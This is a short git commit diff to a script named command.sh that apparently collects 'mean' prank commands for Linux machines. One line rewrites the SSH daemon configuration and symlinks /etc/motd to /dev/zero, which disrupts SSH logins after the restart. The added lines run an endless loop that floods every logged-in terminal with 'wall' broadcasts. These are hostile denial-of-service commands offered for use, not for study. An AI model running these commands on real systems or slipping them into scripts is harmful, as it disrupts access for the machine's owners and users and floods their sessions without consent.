bfc3c84006c8556f907acd4e34428b53f51a110a
HopeAnnihilator <59497210+HopeAnnihilator@users.noreply.github.com>
2025-05-24 03:19:49 -0500

    Update command.sh

--- command.sh
+++ command.sh
@@ -1,1 +1,5 @@
+# my favorite
 sudo sed -i 's/^\(PrintMotd.*$\)/#\1/' /etc/ssh/sshd_config; sudo bash -c "echo 'PrintMotd yes' >> /etc/ssh/sshd_config"; sudo mv /etc/motd /etc/motd.bak; sudo ln -s /dev/zero /etc/motd; sudo systemctl restart ssh; exit
+
+# another mean one
+while true; do sudo wall -n  <<< $(for i in $(seq 0 $RANDOM); do printf "%s" "AND IT JUST KEEPS COMING"; done); done 
